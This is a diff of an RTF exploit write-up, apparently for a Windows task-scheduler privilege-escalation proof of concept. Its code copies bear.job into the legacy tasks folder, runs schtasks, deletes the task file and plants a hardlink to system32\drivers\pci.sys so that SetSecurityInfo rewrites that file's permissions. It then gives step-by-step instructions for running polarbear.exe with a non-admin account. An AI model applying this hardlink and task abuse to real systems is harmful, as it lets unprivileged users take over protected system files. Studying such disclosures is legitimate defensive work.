@@ -6656,10 +6656,10 @@ This can be easily abused.\par
 \par
 The PoC code:\par
 \par
-\cf3\f1\fs19 CopyFile\cf4 (\cf1 L"bear.job"\cf4 , \cf1 L"c:{{\field{\*\fldinst{HYPERLINK "\\\\\\\\windows\\\\\\\\tasks\\\\\\\\bear.job",FALSE"}}{\fldrslt{\\\\windows\\\\tasks\\\\bear.job"\cf4 ,\cf3 FALSE\ul0\cf0}}}}\cf4\f1\fs19 );\par
+\cf3\f1\fs19 CopyFile\cf4 (\cf1 L"bear.job"\cf4 , \cf1 L"c:{{\field{\*\fldinst{HYPERLINK "\\\\\\\\windows\\\\\\\\tasks\\\\\\\\bear.job"}}{\fldrslt{\ul\cf2\\\\windows\\\\tasks\\\\bear.job"\cf4 ,\cf3 FALSE}}}}\cf4\f1\fs19 );\par
 \tab system(command.c_str());\par
-\tab\cf3 DeleteFile\cf4 (\cf1 L"c:{{\field{\*\fldinst{HYPERLINK "\\\\\\\\windows\\\\\\\\system32\\\\\\\\tasks\\\\\\\\Bear"}}{\fldrslt{\\\\windows\\\\system32\\\\tasks\\\\Bear\ul0\cf0}}}}\f1\fs19 "\cf4 );\par
-\tab CreateNativeHardlink(\cf1 L"c:{{\field{\*\fldinst{HYPERLINK "\\\\\\\\windows\\\\\\\\system32\\\\\\\\tasks\\\\\\\\bear"}}{\fldrslt{\\\\windows\\\\system32\\\\tasks\\\\bear\ul0\cf0}}}}\f1\fs19 "\cf4 , \cf1 L"C:{{\field{\*\fldinst{HYPERLINK "\\\\\\\\Windows\\\\\\\\system32\\\\\\\\drivers\\\\\\\\pci.sys"}}{\fldrslt{\\\\Windows\\\\system32\\\\drivers\\\\pci.sys\ul0\cf0}}}}\f1\fs19 "\cf4 );\par
+\tab\cf3 DeleteFile\cf4 (\cf1 L"c:{\cf0{\field{\*\fldinst{HYPERLINK "\\\\\\\\windows\\\\\\\\system32\\\\\\\\tasks\\\\\\\\Bear"}}{\fldrslt{\\\\windows\\\\system32\\\\tasks\\\\Bear\ul0\cf0}}}}\f1\fs19 "\cf4 );\par
+\tab CreateNativeHardlink(\cf1 L"c:{\cf0{\field{\*\fldinst{HYPERLINK "\\\\\\\\windows\\\\\\\\system32\\\\\\\\tasks\\\\\\\\bear"}}{\fldrslt{\\\\windows\\\\system32\\\\tasks\\\\bear\ul0\cf0}}}}\f1\fs19 "\cf4 , \cf1 L"C:{\cf0{\field{\*\fldinst{HYPERLINK "\\\\\\\\Windows\\\\\\\\system32\\\\\\\\drivers\\\\\\\\pci.sys"}}{\fldrslt{\\\\Windows\\\\system32\\\\drivers\\\\pci.sys\ul0\cf0}}}}\f1\fs19 "\cf4 );\par
 \tab system(command.c_str());\par
 \cf0\f0\fs22\par
 First we copy bear .job into the legacy tasks folder.\par
@@ -6668,6 +6668,7 @@ Then we call "\cf1\f1\fs19 schtasks /change /TN "\f2\lang1033 bear\f1\lang9 " /R
 After that we delete the file it created. And plant a hardlink and re-run the same command.\par
 This time it will call SetSecurityInfo on our hardlink.\par
 \b How to run the PoC\par
+(you need to rebuild for x64, included binary is x86)\par
 \b0 1. copy polarbear.exe, bear.job, schtasks.exe, schtasks.dll from the folder "poc files" to your test VM\par
 2. run polarbear.exe passing a username and password of a local non admin account. I.e "polarbear.exe essbee polarbear"\par
 You can use the included video demo as reference.\par
